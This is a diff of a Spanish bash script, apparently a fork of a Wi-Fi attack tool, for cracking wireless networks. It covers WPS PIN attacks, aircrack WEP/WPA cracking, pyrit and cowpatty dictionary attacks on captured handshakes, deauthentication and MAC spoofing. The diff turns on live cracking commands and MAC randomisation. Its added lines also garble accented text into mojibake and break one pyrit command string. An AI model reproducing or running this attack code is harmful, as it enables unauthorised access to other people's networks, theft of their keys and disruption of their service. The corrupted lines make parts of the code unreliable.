@@ -88,8 +88,8 @@ ActivarModoMonitor(){
 CheckInterface() {
 
 	if [ "$(ip route|grep "$TARJETA_SELECCIONADA")" ]; then
-		yad --image "error" --title "ERROR" --button=gtk-ok:0 --text "<b>ERROR</b>: La interface $TARJETA_SELECCIONADA está asociada a un punto de acceso, no se puede continuar" --fixed --on-top --center --window-icon=ICONOS/SCRIPT.png 
-		echo "ERROR: La interface $TARJETA_SELECCIONADA está asociada a un punto de acceso, no se puede continuar" > $ARCHIVO_STATUSBAR
+		yad --image "error" --title "ERROR" --button=gtk-ok:0 --text "<b>ERROR</b>: La interface $TARJETA_SELECCIONADA esta asociada a un punto de acceso, no se puede continuar" --fixed --on-top --center --window-icon=ICONOS/SCRIPT.png 
+		echo "ERROR: La interface $TARJETA_SELECCIONADA esta asociada a un punto de acceso, no se puede continuar" > $ARCHIVO_STATUSBAR
 		echo "1" > $ARCHIVO_LOG
 		unset TARJETA_SELECCIONADA
 		return 1
@@ -100,10 +100,13 @@ CheckInterface() {
 
 ResetInterface() {
 DRIVER=`ls -l /sys/class/net/$TARJETA_SELECCIONADA/device/driver | awk -F '/' '{print $NF}'`
+
+####
 DesactivarMONsX
 unset DRIVER
 return 0
-	
+##### Por ahora deshabilito el resto de la funcion por los problemas de desaparecer las interfaces de red
+
 rmmod -f "$DRIVER" >/dev/null 2>&1 
 if [ "$DRIVER" = "ath9k_htc" ]
 then
@@ -232,6 +235,7 @@ ProcesarDatosEscaneoAirodump() {
 	head -n $HeTa "$ARCHIVO_CAPTURAS-01.csv" &> "$ARCHIVO_CAPTURAS-02.csv"
 	tail -n +$HeTa "$ARCHIVO_CAPTURAS-01.csv" &> "$ARCHIVO_CAPTURAS-clients.csv"
 
+	#sed '/^$/d' "$LOG_VARIOS" > "$LOG_AIRODUMP"
 	LINEAS_LOG=$(cat "$ARCHIVO_CAPTURAS-02.csv" | wc -l | awk {' print$1 '})
     
 	if [ $LINEAS_LOG -eq 0 ] 
@@ -250,6 +254,9 @@ ProcesarDatosEscaneoAirodump() {
 	echo "----------------------------------------------" >> "$LOG_AIRODUMP"
 	while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY
 	do
+	    #if ! grep -q $MAC "$ARCHIVO_REDES_SCAN"
+	    #then
+
 		v="0"
 		length=${#MAC}
 		PRIVACY=$(echo $PRIVACY| tr -d "^ ")
@@ -349,62 +356,6 @@ ProcesarDatosEscaneoAirodump() {
 }
 
 
-TipoAtaque(){
-  MODO_ATAQUE=$(cat $ARCHIVO_TIPO_ATAQUE)
-  case $MODO_ATAQUE in
-    "1") AUTOMATICO=0 ; ACTUALIZAR_SCAN="SI"; ExtraerDatosAp ;;
-    "2") AUTOMATICO=1 ; ACTUALIZAR_SCAN="SI"; AtacarTodos ;;
-    "3") AUTOMATICO=0 ; ACTUALIZAR_SCAN="NO"; IntroducirDatosAp ;;
-  esac
-  echo "FIN" > $ARCHIVO_LOG
-  unset MODO_ATAQUE
-}
-
-
-
-IntroducirDatosAp(){
-datos=$(yad --width=400 --title="ATAQUE MANUAL" --text="<b>Introduce los datos solicitados</b>" --fixed --on-top --center --window-icon=ICONOS/SCRIPT.png \
---form \
---image=$ICONO_MENSAJES \
---field="BSSID" \
---field="CANAL:CBE" \
-"" '1!2!3!4!5!6!7!8!9!10!11!12!13')
-
-BSSID=$(echo $datos | awk -F "|" {'print $1'})
-BSSID=$(echo $BSSID | awk '{print toupper($0)}')
-CANAL=$(echo $datos | awk -F "|" {'print $2'})
-
-if [ -z $BSSID ]; then echo "FIN" > $ARCHIVO_LOG; return; fi
-
-if  ! ValidarMac $BSSID
-then 
-  yad --image "error" --title "ERROR" --button=gtk-ok:0 --text "<b>ERROR</b>: Formato de mac incorrecto" --fixed --on-top --center --window-icon=ICONOS/SCRIPT.png 
-  echo "1" $ARCHIVO_LOG
-  return
-fi
-let vez=1
-AtacarAP
-unset datos
-}
-
-
-
-AtacarTodos() {
-  ATAQUE_DETENIDO="NO"
-  TOTAL_LINEAS=$(cat $ARCHIVO_REDES_SCAN | wc -l | awk {' print$1 '})
-  let TOTAL_LINEAS=$TOTAL_LINEAS+1
-  
-  for MA in `seq 1 $TOTAL_LINEAS` 
-  do
-    if [ $ATAQUE_DETENIDO = "SI" ]; then return; fi
-    LINEA_ATAQUE=$MA
-    ExtraerDatosAp
-  done
-  echo "ATAQUE AUTOMATICO ACABADO" > $ARCHIVO_STATUSBAR
-}
-
-
-
 ExtraerDatosAp() {
   LINEA_AUX=$LINEA_ATAQUE
   LINEA_ATAQUE=$(head -$LINEA_ATAQUE $ARCHIVO_REDES_SCAN | tail -1)
@@ -417,7 +368,7 @@ ExtraerDatosAp() {
   then
     if [ $AUTOMATICO = 0 ]
     then
-      seguir=$(yad --image "dialog-question" --title "PIN YA CONSEGUIDO" --button=gtk-yes:1 --yes-label "SI" --button=gtk-no:0 --text "<b>PIN YA CONSEGUIDO</b>: Ya se tiene este PIN almacenado. ¿ Quieres volver a atacar $BSSID ? " --width=450 --on-top --center --window-icon=ICONOS/SCRIPT.png)
+      seguir=$(yad --image "dialog-question" --title "PIN YA CONSEGUIDO" --button=gtk-yes:1 --yes-label "SI" --button=gtk-no:0 --text "<b>PIN YA CONSEGUIDO</b>: Ya se tiene este PIN almacenado. À Quieres volver a atacar $BSSID ? " --width=450 --on-top --center --window-icon=ICONOS/SCRIPT.png)
       ret=$?
       if [ $ret = "1" ]
       then
@@ -509,6 +460,8 @@ AtacarAP(){
   AnalizarLogPixiewps
   echo "1" > $ARCHIVO_LOG
 }
+
+
 
 AnalizarLogPixiewps(){
   lineas_log=$(cat $ARCHIVO_TXT_ATAQUE | wc -l | awk {' print$1 '})
@@ -889,132 +842,14 @@ if [ $1 = "2" ]; then TIEMPO=$TIEMPO_SCANEO > $ARCHIVO_LOG;fi
 if [ $1 = "3" ]; then TIEMPO=$TIEMPO_ATAQUE > $ARCHIVO_LOG; fi
 
 if [ $TIEMPO -lt 1 ] ; then
-   yad --image "error" --title "ERROR" --button=gtk-ok:0 --text "<b>ERROR</b>: El tiempo máximo introducido no es correcto : [ $TIEMPO_SCANEO ]" --fixed --on-top --center --window-icon=ICONOS/SCRIPT.png
-   echo "El tiempo máximo introducido no es correcto : [ $TIEMPO_SCANEO ]" > $ARCHIVO_STATUSBAR
+   yad --image "error" --title "ERROR" --button=gtk-ok:0 --text "<b>ERROR</b>: El tiempo m‡ximo introducido no es correcto : [ $TIEMPO_SCANEO ]" --fixed --on-top --center --window-icon=ICONOS/SCRIPT.png
+   echo "El tiempo m‡ximo introducido no es correcto : [ $TIEMPO_SCANEO ]" > $ARCHIVO_STATUSBAR
    if [ $1 = "2" ]; then echo "1" > $ARCHIVO_LOG;fi
    if [ $1 = "3" ]; then echo "FIN" > $ARCHIVO_LOG; fi
    exit
 fi
 unset TIEMPO re
 }
-
-
-
-CopiarPortapapeles(){
-LINEA_PORTAPAPELES=$(grep $LINEA_PORTAPAPELES $ARCHIVO_DATABASE_KEYS)
-case $COLUMNA_A_COPIAR in
-  "WPA") LINEA_PORTAPAPELES=$(echo $LINEA_PORTAPAPELES | awk -F"|" {'print $4'})
-	 echo -n $LINEA_PORTAPAPELES | xclip -selection clipboard 
-	 ;;
-  "WPS") LINEA_PORTAPAPELES=$(echo $LINEA_PORTAPAPELES | awk -F"|" {'print $3'})
-	 echo -n $LINEA_PORTAPAPELES | xclip -selection clipboard 
-	 ;;
-  "TODO") LINEA_PORTAPAPELES=$(echo $LINEA_PORTAPAPELES | awk -F"|" {' print $1,$2,$3,$4,$5,$6,$7,$8,$9 '})
-	 echo -n $LINEA_PORTAPAPELES | xclip -selection clipboard 
-	 ;;
-esac
-unset LINEA_PORTAPAPELES COLUMNA_A_COPIAR
-}
-
-
-
-ExportarKeys(){
-ARCHIVO_EXP=$(date +%d-%m-%Y)
-ARCHIVO_EXP="PixieScript_$ARCHIVO_EXP.DATOS"
-PATH_ARCHIVO_EXP="$HOME/Desktop/$ARCHIVO_EXP"
-
-palabras=$(wc -w $ARCHIVO_DATABASE_KEYS | awk {' print $1 '})
-if [ "$palabras" -gt "1" ] 
-then
-  TOTAL=$(wc -l $ARCHIVO_DATABASE_KEYS | awk {'print $1'})
-  TOTAL=$(expr $TOTAL + 1)
-  for A in `seq 1 $TOTAL` ; do
-      LINEA_PORTAPAPELES=$(head -$A $ARCHIVO_DATABASE_KEYS | tail -1)
-      LINEA_PORTAPAPELES=$(echo $LINEA_PORTAPAPELES | awk -F"|" {' print $1,$2,$3,$4,$5,$6,$7,$8,$9 '})
-      echo $LINEA_PORTAPAPELES >> $PATH_ARCHIVO_EXP
-      echo "" >> $PATH_ARCHIVO_EXP
-  done 
-  echo "SE HAN EXPORTADO LOS DATOS AL ARCHIVO $ARCHIVO_EXP , LO ENCONTRARAS EN TU ESCRITORIO" > $ARCHIVO_STATUSBAR
-fi
-unset ARCHIVO_EXP LINEA_PORTAPAPELES PATH_ARCHIVO_EXP palabras TOTAL
-}
-
-
-
-ActualizarScript(){
-if ! ComprobarConexion
-then
-  yad --image "error" --title "ERROR" --button=gtk-ok:0 --text "<b>ERROR</b>: Necesitas una conexión a internet para poder actualizar" --fixed --on-top --center --window-icon=ICONOS/SCRIPT.png 
-  return
-fi
-echo "Buscando nueva versión de PixieScript" > $ARCHIVO_STATUSBAR
-wget https://sourceforge.net/projects/pixiescript/ &> /dev/null
-LINEA_VERSION=$(cat index.html | grep "/projects/pixiescript/files/latest/download" | awk {' print $4  '} | awk -F"v" {' print $2 '})
-VERSION_DISPONIBLE=$(echo $LINEA_VERSION |  awk -F"." {' print $1 '})
-SUBVERSION_DISPONIBLE=$(echo $LINEA_VERSION | awk -F"." {' print $2'})
-VERSION_ACTUAL=$(echo $VERSION | awk -F"." {' print $1 '})
-SUBVERSION_ACTUAL=$(echo $VERSION | awk -F"." {' print $2 '})
-
-ACTUALIZAR="NO"
-if [ $VERSION_ACTUAL -lt $VERSION_DISPONIBLE ]; then ACTUALIZAR="SI"; fi
-if [ $VERSION_ACTUAL -eq $VERSION_DISPONIBLE ] && [ $SUBVERSION_ACTUAL -lt $SUBVERSION_DISPONIBLE ]; then ACTUALIZAR="SI"; fi
-if [ $ACTUALIZAR = "SI"  ]
-then
-    echo "Hay una nueva versión disponible : PixieScript_v$VERSION_DISPONIBLE.$SUBVERSION_DISPONIBLE" > $ARCHIVO_STATUSBAR
-    descargar=$(yad --image "dialog-question" --title "ACTUALIZACION DISPONIBLE" --button=gtk-yes:1 --yes-label "SI" --button=gtk-no:0 --text "<b>NUEVA VERSION DISPONIBLE</b>: ¿ Quieres descargar la versión PixieScript_v$VERSION_DISPONIBLE.$SUBVERSION_DISPONIBLE ?" --width=450 --on-top --center --window-icon=ICONOS/SCRIPT.png)
-    ret=$?
-    if [ $ret = "1" ]
-    then
-	wget http://downloads.sourceforge.net/project/pixiescript/PixieScript_v$VERSION_DISPONIBLE.$SUBVERSION_DISPONIBLE.tar.gz &>/dev/null
-	mv PixieScript_v$VERSION_DISPONIBLE.$SUBVERSION_DISPONIBLE.tar.gz "$HOME/Desktop/PixieScript_v$VERSION_DISPONIBLE.$SUBVERSION_DISPONIBLE.tar.gz"
-	echo "Se ha descargado la nueva versión, la encontrarás en tu escritorio" > $ARCHIVO_STATUSBAR
-    fi
-else
-    echo "Ya dispones de la última versión del script" > $ARCHIVO_STATUSBAR
-fi
-rm index.html* &> /dev/null
-unset  VERSION_DISPONIBLE SUBVERSION_DISPONIBLE VERSION_ACTUAL SUBVERSION_ACTUAL ACTUALIZAR descargar ret
-}
-
-
-
-ActualizarDatabase(){
-if ! ComprobarConexion
-then
-  yad --image "error" --title "ERROR" --button=gtk-ok:0 --text "<b>ERROR</b>: Necesitas una conexión a internet para poder actualizar" --fixed --on-top --center --window-icon=ICONOS/SCRIPT.png 
-  return
-fi
-version_actual=$(head -1 $ARCHIVO_VULNERABLES | awk -F"." {' print $2 '} | sed -n -e '1x;1!H;${x;s-\r- -gp}')
-curl -s http://pastebin.com/raw.php?i=nk9pYusb > DATABASE_TEMP
-version_disponible=$(head -1 DATABASE_TEMP | awk -F"." {' print $2 '} | sed -n -e '1x;1!H;${x;s-\r- -gp}')
-
-let version_actual=$(printf %d $version_actual)
-let version_disponible=$(printf %d $version_disponible)
-
-if [ "$version_actual" -lt "$version_disponible" ]
-then
-  mv DATABASE_TEMP $ARCHIVO_VULNERABLES
-  echo "Se ha actualizado la base de datos de los BSSIDs vulnerables" > $ARCHIVO_STATUSBAR
-  
-else
-  rm DATABASE_TEMP
-  echo "Ya dispones de la última versión de BSSIDs vulnerables" > $ARCHIVO_STATUSBAR
-fi
-unset version_actual version_disponible
-}
-
-
-
-ComprobarConexion(){
-ping -c 4 www.google.com > /dev/null
-if [ "$?" -eq 0 ]
-then
-  return 0
-else
-  return 1
-fi
-}
-
 
 
 CambioMacRandom() {
@@ -1034,43 +869,6 @@ echo "La nueva mac para $INTERFACE_MONITOR es $TARJETA_SELECCIONADA_MAC" > $ARCH
 echo $TARJETA_SELECCIONADA_MAC > "$LOG_TARJETA"
 unset INTERFACE_MONITOR TARJETA_SELECCIONADA TARJETA_SELECCIONADA_MAC
 }
-
-
-
-CambioMacManual() {
-INTERFACE_MONITOR=$(cat $ARCHIVO_TARJETA_MONITOR) &> /dev/null
-if [ -z $INTERFACE_MONITOR ]
-then
-  yad --image "info" --title "ATENCION" --button=gtk-ok:0 --text "<b>ATENCION</b>: Debes activar primero el modo monitor para cambiar la MAC" --width=400  --on-top --center --window-icon=ICONOS/SCRIPT.png 
-  exit
-fi
-TARJETA_SELECCIONADA=$INTERFACE_MONITOR
-datos=$(yad --width=400 --title="CAMBIO DE MAC" --text="<b>Introduce la MAC ADRESS deseada</b>" --fixed --on-top --center --window-icon=ICONOS/SCRIPT.png \
---form \
---image=$ICONO_MENSAJES \
---field="MAC ADRESS" )
-NUEVA_MAC=$(echo $datos | awk  '{print toupper($0)}' | sed 's/|/ /g')
-if [ -z $NUEVA_MAC ]; then return; fi                                                                                                                                                     
-
-if  ! ValidarMac $NUEVA_MAC
-then 
-  yad --image "error" --title "ERROR" --button=gtk-ok:0 --text "<b>ERROR</b>: Formato de mac incorrecto" --fixed --on-top --center --window-icon=ICONOS/SCRIPT.png 
-  return
-fi
-ifconfig $INTERFACE_MONITOR down
-macchanger -m $NUEVA_MAC $INTERFACE_MONITOR  &> /dev/null
-ifconfig $INTERFACE_MONITOR up
-TARJETA_SELECCIONADA_MAC="$(cat "/sys/class/net/$TARJETA_SELECCIONADA/address"|tr '[:lower:]' '[:upper:]')"
-if [ $TARJETA_SELECCIONADA_MAC = $NUEVA_MAC ]
-then
-    DeshabilitarNetworkManager ON
-    echo "La nueva mac para $INTERFACE_MONITOR es $TARJETA_SELECCIONADA_MAC" > $ARCHIVO_STATUSBAR
-else
-    echo "No se ha podido cambiar la MAC ADRESS en $INTERFACE_MONITOR" > $ARCHIVO_STATUSBAR
-fi
-unset INTERFACE_MONITOR TARJETA_SELECCIONADA datos NUEVA_MAC 
-}
-
 
 
 LIMPIAR() {
@@ -1105,7 +903,7 @@ EsperarAcabarAircrack() {
 
 
 BuscarClienteConectado() {
-	echo "***********Buscando CLiente Conectado"
+	echo "***********Buscando Cliente Conectado"
 	TIEMPO_ESCANEO="60"
 	TARJETA_SELECCIONADA_AUX=$TARJETA_SELECCIONADA_MAC
 	for A in `seq 1 $TIEMPO_ESCANEO` 
@@ -1123,7 +921,7 @@ BuscarClienteConectado() {
 	      echo "Utilizando MAC cliente: $TARJETA_SELECCIONADA_MAC" > $ARCHIVO_STATUSBAR
 	      return
 	   else
-	      echo "$A: Ningún CLIENTE detectado: $TARJETA_SELECCIONADA_MAC" > $ARCHIVO_STATUSBAR
+	      echo "$A: Ningœn CLIENTE detectado: $TARJETA_SELECCIONADA_MAC" > $ARCHIVO_STATUSBAR
 	   fi
 	done
 	TARJETA_SELECCIONADA_MAC=$TARJETA_SELECCIONADA_AUX
@@ -1134,7 +932,7 @@ BuscarClienteConectado() {
 
 AircrackWEP() {
 	echo "***************** Aircrack WEP******************"
-	#CambioMacRandom
+	CambioMacRandom
 	LINEA_AUX=$LINEA_ATAQUE
 	LINEA_ATAQUE=$(head -$LINEA_ATAQUE "$ARCHIVO_REDES_SCAN" | tail -1)
 	BSSID=$(echo "$LINEA_ATAQUE" | awk -F "|" {' print $3 '})
@@ -1146,7 +944,7 @@ AircrackWEP() {
 
 	if [ ! `echo $TARJETA_SELECCIONADA_MAC | grep ":"` ]
 	then
-		#Utilizo mi propia interfaz para realizar falsa autenticación
+		#Utilizo mi propia interfaz para realizar falsa autenticaci—n
 		TARJETA_SELECCIONADA_MAC=$(head -1 "$LOG_TARJETA" | tail -1)
 	else
 		TARJETA_SELECCIONADA_MAC=$(echo "$CLIENT" | awk -F "," {' print $1 '})		
@@ -1218,7 +1016,7 @@ AircrackWPA() {
 
 	if [ ! `echo $TARJETA_SELECCIONADA_MAC | grep ":"` ]
 	then
-		#Utilizo mi propia interfaz para realizar falsa autenticación
+		#Utilizo mi propia interfaz para realizar falsa autenticaci—n
 		TARJETA_SELECCIONADA_MAC=$(head -1 "$LOG_TARJETA" | tail -1)
 	else
 		TARJETA_SELECCIONADA_MAC=$(echo "$CLIENT" | awk -F "," {' print $1 '})		
@@ -1279,24 +1077,24 @@ AnalizarPyrit() {
 	ESSID=$(echo "$LINEA_ATAQUE" | awk -F "|" {' print $9 '})
 	
 	#Creamos el ESSI real del handshake capturado
-		#pyrit -e "$ESSID" create_essid
-	X1="pyrit –e "$ESSID" create_essid"
+	pyrit -e "$ESSID" create_essid
+	X1="pyrit Ðe "$ESSID" create_essid"
 	sleep 10s
 
 	#utilizamos diccionario rockyou.txt renombrado a wpa.lst
-		#pyrit -i $WORDLIST import_passwords
+	pyrit -i $WORDLIST import_passwords
 	X2="pyrit -i $WORDLIST import_passwords"
 	sleep 600s
 
 	#Creamos las tablas utilizando proceso batch
-		#pyrit batch
+	pyrit batch
 	X3="pyrit batch"
 
 	#Asumimos que tenemos capturado el handshake
 	#X4="pyrit -r captura-01.cap attack_db"
 	#pyrit -r "$CAPTURA_AIRCRACK-01.cap" attack_db >> "$LOG_PYRIT" &
 	#Si no deseamos utilizad la Base de Datos utilizamos lo siguiente, pero es mas lento. 
-		#pyrit -r $CAPTURA_AIRCRACK-01.cap -i $WORDLIST attack_passthrough >> "$LOG_PYRIT" &
+	pyrit -r $CAPTURA_AIRCRACK-01.cap -i $WORDLIST attack_passthrough >> "$LOG_PYRIT" &
 	X4="pyrit -r captura-01.cap -i wordlist attack_passthrough"
 
 	X5="60"
@@ -1309,7 +1107,7 @@ AnalizarPyrit() {
 	fi
 
 	#pyrit -e $ESSID -o $COWFILE export_cowpatty
-	#cowpatty -d $COWFILE -s $ESSID -r "$CAPTURA_AIRCRACK-01.cap"
+	cowpatty -d $COWFILE -s $ESSID -r "$CAPTURA_AIRCRACK-01.cap"
 
 	X7="PYRIT.LOG"
 
@@ -1330,7 +1128,7 @@ DenegacionServicio() {
 
 	if [ ! `echo $TARJETA_SELECCIONADA_MAC | grep ":"` ]
 	then
-		#Utilizo mi propia interfaz para realizar falsa autenticación
+		#Utilizo mi propia interfaz para realizar falsa autenticaci—n
 		TARJETA_SELECCIONADA_MAC=$(head -1 "$LOG_TARJETA" | tail -1)
 	else
 		TARJETA_SELECCIONADA_MAC=$(echo "$CLIENT" | awk -F "," {' print $1 '})		
@@ -1413,11 +1211,6 @@ case $1 in
   "2") TIEMPO_SCANEO=$2 ; ValidarTiempos 2; ScanearRedes ;;
   "3") TIEMPO_ATAQUE=$2; LINEA_ATAQUE=$3; ValidarTiempos 3; ExtraerDatosAp;AircrackWPA;DenegacionServicio;CrearInformeWPA;;
   "4") TARJETA_SELECCIONADA=$2;LIMPIAR ;;
-  "5") LINEA_PORTAPAPELES=$2; COLUMNA_A_COPIAR=$3;CopiarPortapapeles;;
-  "6") ExportarKeys;;
-  "7") ActualizarScript;;
-  "8") ActualizarDatabase;;
-  "9") CambioMacManual;;
  "10") CambioMacRandom;;
  "11") TIEMPO_ATAQUE=$2; LINEA_ATAQUE=$3; ValidarTiempos 3; AircrackWEP;DenegacionServicio; CrearInformeWEP;;
 esac
